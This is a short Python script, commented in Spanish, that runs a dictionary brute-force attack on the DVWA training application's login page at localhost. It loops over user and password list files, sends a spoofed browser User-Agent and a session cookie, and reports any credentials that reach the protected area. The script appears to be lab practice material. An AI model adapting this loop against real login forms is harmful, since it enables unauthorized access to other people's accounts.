import requests

url = 'http://localhost:8080/vulnerabilities/brute/'

# Archivos de texto con usuarios y contraseñas
users_file = 'userlist.txt'
passwords_file = 'passwordlist.txt'

# Cabeceras HTTP a utilizar para la solicitud
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
}
#colocar phpsessid de inicio de sesion
cookies = {
    'PHPSESSID': '0537ef682d77eb4ae4fb23df8861956d',
    'security': 'low'  # Nivel de seguridad bajo en DVWA
}

def read_lines(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# Función para realizar el ataque de fuerza bruta
def brute_force_attack():
    users = read_lines(users_file)
    passwords = read_lines(passwords_file)

    for username in users:
        for password in passwords:
        #datos del formulario
            data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }

            response = requests.post(url, headers=headers,cookies=cookies, params=data)

            # se verifica el contenido de la página para encontrar el mensaje a interes
            if 'Welcome to the password protected area' in response.text:
                print(f'[SUCCESS] Usuario: {username} Contraseña: {password}')
            else:
                pass

brute_force_attack()




